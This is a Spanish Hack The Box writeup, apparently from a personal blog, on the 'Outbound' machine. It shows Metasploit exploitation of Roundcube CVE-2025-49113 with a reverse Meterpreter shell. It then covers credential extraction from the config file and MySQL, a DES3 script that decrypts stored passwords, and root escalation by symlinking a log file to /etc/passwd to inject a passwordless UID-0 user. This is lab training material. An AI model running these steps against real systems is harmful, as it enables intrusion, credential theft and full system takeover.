---
title: "Outbound — EASY"
date: 2025-11-15 12:00:00 -0700
categories: [Writeups, HTB]
tags: [HTB, outbound, roundcube, cve-2025-49113, des3, mysql, below, symlink, rce]
image: /assets/img/outbound/Outbound-HTB.png
toc: true
comments: true
description: "Writeup técnico paso a paso de 'Outbound' (HTB): explotación del CVE-2025-49113 en Roundcube, desencriptado de credenciales DES3 desde MySQL, y escalada de privilegios mediante un ataque de Symlink abusando de la herramienta de monitoreo 'below'."
---

# 🚀 Outbound — EASY

📅 **Fecha:** 14-11-2025  
🔗 **IP objetivo:** `10.10.11.77`  
🔍 **Estado:** 🎯 Resuelta  
👤 **Autor:** Roberto

---

## TL;DR

Comenzamos con credenciales filtradas en un entorno simulado. Explotamos una vulnerabilidad de RCE en **Roundcube Webmail (CVE-2025-49113)**. En la post-explotación, recuperamos claves de configuración, accedimos a la base de datos MySQL y desciframos una contraseña de usuario usando un script propio para **DES3-CBC**. Finalmente, escalamos a **root** abusando de los permisos de sudo sobre la herramienta **Below**, mediante un ataque de enlaces simbólicos (**symlink**) contra `/etc/passwd`.

---

## Contexto

> As is common in real life pentests, you will start the Outbound box with credentials for the following account tyler / LhKL109Nm3X2

La propia descripción de la máquina deja claro el contexto: esto simula un pentest interno donde el cliente ya te da unas credenciales filtradas o comprometidas de un empleado (`tyler`). A partir de ahí, tu trabajo es medir el impacto: hasta dónde puedes llegar dentro de la infraestructura usando solo eso.

---

## Reconocimiento

Lo primero es siempre ver qué superficie tenemos expuesta. Lanzamos un escaneo completo de puertos con Nmap para averiguar qué servicios están disponibles en la máquina:

```bash
╭─kali@kali ~ via 🐍 v3.13.7  at 🕐 16:58
╰─❯ nmap -A -p- 10.10.11.77 -T4
```

El parámetro -A activa detección de versión, sistema operativo, scripts y traceroute. -p- recorre todos los puertos TCP (1–65535). -T4 acelera un poco el escaneo.

Salida del escaneo (resumen relevante):

```bash
Starting Nmap 7.95 ([https://nmap.org](https://nmap.org)) at 2025-07-13 00:00 +05
Nmap scan report for 10.10.11.77
Host is up (0.090s latency).
Not shown: 65533 closed tcp ports (reset)
PORT STATE SERVICE VERSION
22/tcp open ssh
| ssh-hostkey:
| 256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_ 256 2d:6d:4a:4cee: 2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open http nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to [http://mail.outbound.htb/](http://mail.outbound.htb/)
|_http-server-header: nginx 1.24.0 (Ubuntu)
Device type: general purpose router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: ...
```

Tenemos SSH en el puerto 22 – potencial entrada futura si conseguimos credenciales de sistema.

Tenemos HTTP en el puerto 80, servido por nginx, que devuelve un título que indica un redirect a http://mail.outbound.htb/.

Como el servidor usa nombres virtuales (vhosts), necesitamos resolver ese dominio hacia la IP de la máquina. Lo añadimos a /etc/hosts:

```bash
echo "10.10.11.77 outbound.htb mail.outbound.htb" | sudo tee -a /etc/hosts
```

Ahora, al visitar http://mail.outbound.htb/ en el navegador, en lugar de ver una página genérica de nginx, obtenemos una página de login.

![Login Roundcube Webmail](/assets/img/outbound/Login.png)

Se trata del login de Roundcube Webmail, un cliente web para correo IMAP muy utilizado en entornos corporativos. Esto ya nos da una idea clara: si comprometemos esto, podemos acceder a correos internos, reset de contraseñas, notificaciones de sistemas, etc.

Dado que ya tenemos credenciales (tyler / LhKL109Nm3X2), las probamos directamente:

Usuario: tyler

Password: LhKL109Nm3X2

Y la autenticación funciona. Entramos al panel de Roundcube:

Jugando un poco con la interfaz, vemos opciones típicas de un webmail: bandeja de entrada, contactos, ajustes, etc. En este entorno en particular aparece la opción de crear usuarios o gestionar cuentas:

Algo muy importante en cualquier app es la versión. Muchas veces, el propio pie de página o una sección de "About" lo indica. Revisando la interfaz encontramos:

![Roundcube About - Versión 1.6.10](/assets/img/outbound/Version.png)

La versión que muestra es Roundcube Webmail 1.6.10.

Buscando información sobre vulnerabilidades asociadas a esa versión, encontramos que es vulnerable a CVE-2025-49113, un RCE autenticado bastante reciente que ya cuenta con módulo en Metasploit:

![Exploit Roundcube CVE-2025-49113 en Metasploit](/assets/img/outbound/ModuloMetasPloit.png)

Perfecto: tenemos credenciales válidas y una versión vulnerable con exploit listo. Turno de romper cosas.

## Explotación (RCE en Roundcube — CVE-2025-49113)

En lugar de reinventar la rueda, aprovechamos el módulo oficial de Metasploit para esta vulnerabilidad:

```bash
msf6 > use exploit/multi/http/roundcube_auth_rce_cve_2025_49113
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set RHOSTS 10.10.11.77
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set RPORT 80
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set SSL false
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set USERNAME tyler
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set PASSWORD LhKL109Nm3X2
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set VHOST mail.outbound.htb
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set TARGETURI http://mail.outbound.htb/?_task=mail&_mbox=INBOX
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set LHOST 10.10.14.15
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set LPORT 4444
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > run
```

Antes de lanzar el exploit, podemos usar check para verificar si el objetivo parece vulnerable:

```bash
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > check
# [+] Extracted version: 10610
# [*] 10.10.11.77:80 - The target appears to be vulnerable.
```
Y luego lanzamos el exploit (run). Salida resumida:

```bash
[+] Started reverse TCP handler on 10.10.14.15:4444
[+] Running automatic check ("set AutoCheck false to disable)
[+] Extracted version: 10610
[+] The target appears to be vulnerable.
[+] Fetching CSRF taken...
[+] Extracted token: @PIMVSva9113877154110ew1Wfp6PAE
[+] Attempting login...
[+] Login successful.
[+] Preparing payload...
[+] Payload successfully generated and serialized.
[+] Uploading malicious payload....
[+] Exploit attempt complete. Check for session.
[+] Sending stage (3045388 bytes) to 10.10.11.77
[+] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.10.11.77:46140)
```

Ya tenemos una Meterpreter session sobre el servidor.

```bash
meterpreter > getuid
Server username: www-data
```

Estamos como www-data. Para trabajar más cómodo, abrimos una shell y la estabilizamos un poco:

```bash
meterpreter > shell
script /dev/null -c bash
```

## Post-Explotación: Configuración y Base de Datos

Como www-data, el siguiente paso lógico es revisar el código y la configuración de la aplicación que acabamos de comprometer.

Dentro de la carpeta config, listamos los archivos:

```bash
www-data@mail:/html/roundcube/config$ ls -la
```

Ahí vemos el típico config.inc.php, así que lo leemos:

```bash
cat config.inc.php
```

Entre muchos ajustes, destacan dos líneas importantes:

```bash
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';
// [...]
$config['des_key'] = 'rcmail-124ByteDESkey*Str';
```

De aquí sacamos:

Usuario de BD: roundcube

Password de BD: RCDBPass2025

Clave DES: rcmail-124ByteDESkey*Str (24 bytes, perfecta para DES3)

El DSN nos dice que Roundcube usa MySQL en localhost. Nos conectamos:

```bash
mysql -u roundcube -pRCDBPass2025
```

Una vez dentro, listamos y seleccionamos:

```
show DATABASES;
USE roundcube;
SELECT * FROM session;
```

La tabla session contiene datos sobre sesiones de usuarios. Entre esas sesiones encontramos una que corresponde al usuario jacob, con algo similar a:

username: jacob

password (cifrado Base64): L7Rv00A8TuwJAr67klTxxcSGnlk25Am/

La forma habitual en Roundcube es: DES3-CBC, IV al inicio del blob, y todo codificado en Base64.

## Descifrado de la contraseña de Jacob (DES3 CBC)

Creamos un pequeño script en Python para hacer el descifrado con la des_key obtenida:

```python
from base64 import b64decode
from Crypto.Cipher import DES3

encrypted_password = "L7Rv00A8TuwJAr67klTxxcSGnlk25Am/"
des_key = b'rcmail-124ByteDESkey*Str'

data = b64decode(encrypted_password)
iv = data[:8]
ciphertext = data[8:]

cipher = DES3.new(des_key, DES3.MODE_CBC, iv)
decrypted = cipher.decrypt(ciphertext)
cleaned = decrypted.rstrip(b'\x00').rstrip(b'\x08').decode('utf-8', errors='ignore')

print("[+] Hecho:", cleaned)
```
Ejecutamos el script:

```bash
╭─kali@kali ~ via 🐍 v3.13.7  at 🕐 16:58
╰─❯ python3 script.py
```

Salida:

```bash
[+] Hecho: 595mO8DmwGeD
```

Ya tenemos la contraseña real de jacob: 595mO8DmwGeD

## Movimiento Lateral a Jacob

## Escalada

La escalada final aprovechará la herramienta **below**, un monitor de recursos similar a `top` pero con más capacidades:

![Below - Monitor de recursos](/assets/img/outbound/below.png)

Ahora que conocemos la contraseña de Jacob, podemos "convertirnos" en él.

```bash
su jacob
Password: 595mO8DmwGeD
```

Ahora estamos dentro como jacob. Revisamos su correo:

```bash
cd /home/jacob/mail/INBOX
cat jacob
```

Encontramos dos correos relevantes. En el primero, enviado por Tyler, hay un cambio de contraseña:

```txt
Due to the recent change of policies your password has been changed.

Please use the following credentials to log into your account: gY4Wr3a1evp4

Remember to change your password when you next log into your account.
```

Aquí Tyler le está diciendo a Jacob que su nueva contraseña es `gY4Wr3a1evp4`. Es otro dato valioso, reutilizable si hiciera falta conectarse por SSH o si hubiera cambiado la password de algún servicio.

En el segundo correo, enviado por Mel, le informan de una herramienta de monitorización:

```txt
We have been experiencing high resource consumption on our main server.
For now we have enabled resource monitoring with Below and have granted you privileges to inspect the the logs.
Please inform us immediately if you notice any irregularities.
```

La parte importante es:

> “For now we have enabled resource monitoring with **Below** and have granted you privileges to inspect the logs.”

Esto nos da una pista directa: hay una herramienta llamada **Below** que Jacob puede usar y que probablemente esté relacionada con la escalada de privilegios.

Antes de ir a por root, podemos sacar la flag de usuario:

Flag de usuario:

```bash
cat user.txt
************************af47
```
## Escalada de Privilegios con Below

Ejecutamos sudo -l:

```bash
Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin, use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below
```
Jacob puede ejecutar **/usr/bin/below** como root sin contraseña.

Investigando el binario, vemos que escribe errores en /var/log/below/error_root.log y que Jacob puede manipular esa ruta. Esto abre el camino para un symlink attack.

Visualmente podemos ver el binario y los permisos:

La idea del exploit es:

Crear una línea con formato **/etc/passwd** para un usuario root falso.

Hacer que **error_root.log** sea un enlace simbólico (symlink) a **/etc/passwd**.

Escribir en el log (o copiar sobre él) para inyectar el usuario.

Inyección de usuario root ficticio (pwn)
Creamos primero un archivo temporal con la línea de usuario (UID 0):

```bash
echo 'pwn::0:0:pwn:/root:/bin/bash' > /tmp/fakepass
```
A continuación, eliminamos el log actual y creamos el symlink:

```bash
rm -f /var/log/below/error_root.log
ln -s /etc/passwd /var/log/below/error_root.log
```

En esta máquina concreta, el entorno nos permite copiar directamente sobre el symlink:

```bash
cp /tmp/fakepass /var/log/below/error_root.log
```

Ahora /etc/passwd contiene la entrada de pwn. Intentamos cambiar al usuario:

```bash
su pwn

id
uid=0(pwn) gid=0(root) groups=0(root)
```

Ya somos UID 0, es decir, equivalente a root.

```bash
cd /root
cat root.txt
************************8064
```

Explicación - Resumen
Esta máquina explota una vulnerabilidad crítica y moderna — **CVE-2025-49113** — en Roundcube Webmail, afectando a la versión 1.6.10.

La aplicación falla al validar la entrada del usuario, permitiendo inyectar un objeto PHP malicioso. Esto provoca una deserialización insegura que otorga RCE bajo el contexto del usuario www-data.

Una vez obtenida la shell, la enumeración revela que config.inc.php contiene la clave de cifrado DES almacenada en texto plano. Esto permite conectarse a la base de datos MySQL, volcar las sesiones y, mediante un script en Python usando DES3-CBC, recuperar la contraseña en texto claro del usuario jacob (595mO8DmwGeD).

Ya como jacob, un correo revela credenciales actualizadas para SSH y, más importante, el comando sudo -l muestra permisos sobre la herramienta Below.

El exploit final es un ataque de Symlink Abuse: redirigimos el archivo de log de below hacia /etc/passwd. Al escribir en él, inyectamos un usuario falso (pwn) con UID 0, logrando así acceso total como root.

Happy hacking :)
